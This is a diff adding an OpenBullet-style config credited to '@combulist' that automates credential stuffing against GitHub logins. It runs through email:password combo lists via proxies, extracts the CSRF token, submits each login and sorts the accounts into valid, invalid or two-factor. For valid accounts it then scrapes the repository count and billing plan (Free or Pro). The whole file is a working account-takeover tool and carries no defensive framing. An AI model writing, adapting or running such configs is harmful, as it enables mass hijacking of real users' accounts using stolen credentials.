@@ -1,0 +1,113 @@
+[SETTINGS]
+{
+  "Name": "Github",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-11T04:26:52.4680827+04:30",
+  "AdditionalInfo": "",
+  "Author": "@combulist",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION CurrentUnixTime -> VAR "tt" 
+
+REQUEST GET "https://github.com/session" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "=\"authenticity_token\" value=\"" "\"" -> VAR "tkn" 
+
+FUNCTION URLEncode "<tkn>" -> VAR "token" 
+
+FUNCTION URLEncode "<USER>" -> VAR "1" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "2" 
+
+FUNCTION Hash SHA256 "<tt>" -> VAR "tts" 
+
+REQUEST POST "https://github.com/session" 
+  CONTENT "commit=Sign+in&authenticity_token=<token>&ga_id=2067617669.1603338905&login=<1>&password=<2>&webauthn-support=supported&webauthn-iuvpaa-support=unsupported&return_to=&allow_signup=&client_id=&integration=&required_field_e0e1=&timestamp=<tt>&timestamp_secret=<tt>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: github.com" 
+  HEADER "Origin: https://github.com" 
+  HEADER "Referer: https://github.com/login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY " Incorrect username or password" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Device verification" 
+  KEYCHAIN Success OR 
+    KEY "sign out" 
+
+PARSE "<SOURCE>" LR "Signed in as <strong class=\"css-truncate-target\">" "<" -> VAR "login" 
+
+REQUEST GET "https://github.com/<login>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "content=\"<login> has " "repositories" CreateEmpty=FALSE -> CAP "RepoS" 
+
+REQUEST GET "https://github.com/settings/billing?_pjax=%23js-pjax-container" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<div>GitHub Free</div>" 
+  KEYCHAIN Success OR 
+    KEY "div>GitHub Pro</div>" 
+
+PARSE "<SOURCE>" LR "<div>GitHub " "</div>" CreateEmpty=FALSE -> CAP "Plan" "Github" "" 
+
+PARSE "<SOURCE>" LR "h4 class=\"f5 text-normal text-gray\">Current " "bill" CreateEmpty=FALSE -> CAP "Type" 
